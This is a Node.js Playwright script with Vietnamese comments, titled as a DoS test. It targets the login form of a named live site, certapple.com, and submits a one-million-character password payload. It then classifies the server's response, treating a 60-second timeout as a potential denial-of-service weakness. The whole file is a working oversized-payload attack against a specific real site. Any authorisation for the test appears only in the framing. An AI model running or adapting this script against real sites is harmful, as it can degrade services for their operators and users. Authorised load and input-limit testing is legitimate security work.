// attack_script_dos_test.js (Version 7 - Final with Hyper-Specific Chained Selector)

const { chromium } = require('playwright');

// --- Cấu hình ---
const TARGET_URL = 'https://certapple.com';
const EMAIL_TEST = 'dos-tester@test.com';
const PAYLOAD_SIZE = 1000000;
const PAYLOAD_CHARACTER = 'A';
// --- Kết thúc cấu hình ---

(async () => {
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();

  try {
    const payload = PAYLOAD_CHARACTER.repeat(PAYLOAD_SIZE);

    console.log(`::group::Truy cập ${TARGET_URL}...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
    console.log('✅ Trang đã tải xong.');
    console.log('::endgroup::');

    console.log('::group::Bắt đầu gửi payload lớn...');
    console.log(`Sẽ thử tấn công với email '${EMAIL_TEST}' và một payload dài ${PAYLOAD_SIZE.toLocaleString()} ký tự.`);
    console.log('------------------------------------');

    try {
      // --- BƯỚC 0: XỬ LÝ CÁC LỚP PHỦ (VÍ DỤ: COOKIE BANNER) ---
      try {
        console.log('Đang kiểm tra và xử lý cookie banner (nếu có)...');
        const cookieButton = page.getByRole('button', { name: /Accept|Allow|Đồng ý|Chấp nhận/i });
        await cookieButton.click({ timeout: 5000 });
        console.log('✅ Đã xử lý cookie banner.');
      } catch (error) {
        console.log('ℹ️ Không tìm thấy cookie banner, hoặc đã xử lý xong. Bỏ qua.');
      }

      // --- BƯỚC 1: Nhấn vào nút "Login" để hiển thị POPUP ---
      console.log('Đang tìm và nhấn vào phần tử "Login" để hiển thị popup...');
      
      // THAY ĐỔI CUỐI CÙNG: Dùng selector đã lọc để đảm bảo chỉ có 1 kết quả.
      // "Tìm một thẻ <a> có class 'w-login-popup' VÀ có chứa text 'Login'"
      await page.locator('a.w-login-popup').filter({ hasText: 'Login' }).click();
      
      console.log('✅ Đã nhấn phần tử "Login". Chờ popup hiển thị...');
      
      // --- BƯỚC 2: Chờ cho form bên trong POPUP hiển thị ---
      await page.locator('#username').waitFor({ state: 'visible', timeout: 10000 });
      console.log('✅ Popup đăng nhập đã hiển thị.');


      // --- CÁC BƯỚC CÒN LẠI ---
      // 3. Tìm và điền vào ô email
      await page.locator('#username').fill(EMAIL_TEST);

      // 4. Tìm và điền PAYLOAD LỚN vào ô mật khẩu
      await page.locator('#password').fill(payload);
      
      // 5. Nhấn nút Đăng nhập bên trong form
      await page.locator('#login_certapple button[type="submit"]').click();

      // 6. Chờ cho trang phản hồi
      console.log('Đã gửi payload. Đang chờ phản hồi từ server...');
      await page.waitForLoadState('networkidle', { timeout: 60000 });

      // 7. Kiểm tra kết quả nếu server phản hồi kịp thời
      const content = await page.content();
      const pageTitle = await page.title();

      if (content.includes('413') || pageTitle.includes('413') || content.toLowerCase().includes('request entity too large')) {
        console.log('✅✅✅ KẾT QUẢ TỐT: Server đã được cấu hình đúng. Nó đã từ chối yêu cầu quá lớn với lỗi 413.');
      } else if (content.includes('Tài khoản hoặc mật khẩu không đúng')) {
        console.log('✅✅ KẾT QUẢ TỐT: Ứng dụng đã xử lý được payload lớn một cách an toàn và chỉ báo lỗi đăng nhập thông thường.');
      } else {
         console.warn("::warning::Phản hồi không xác định. Cần kiểm tra thủ công.");
      }
      
    } catch (e) {
      if (e.message.includes('timeout')) {
        if (e.message.includes("filter({ hasText: 'Login' })")) {
            console.error(`::error::Không tìm thấy selector đã lọc 'a.w-login-popup' có chữ 'Login'. Trang web có thể đã thay đổi.`);
        } else if (e.message.includes("locator('#username').waitFor")) {
            console.error(`::error::Đã click được "Login" nhưng popup hoặc ô username không xuất hiện sau 10 giây.`);
        } else if (e.message.includes('waitForLoadState')) {
            console.error(`::error::LỖ HỔNG TIỀM TÀNG (DoS)! Server không phản hồi trong 60 giây sau khi gửi payload.`);
        } else {
            console.error(`::error::Lỗi timeout không xác định: ${e.message}`);
        }
      } else {
        console.error(`::error::Lỗi trong quá trình tương tác với trang: ${e.message}`);
      }
      process.exit(1);
    }
    
    console.log('------------------------------------');
    console.log('✅✅✅ KIỂM TRA HOÀN TẤT. Vui lòng xem kết quả log ở trên.');
    console.log('::endgroup::');

  } catch (error) {
    console.error(`::error::Đã xảy ra lỗi nghiêm trọng: ${error}`);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();
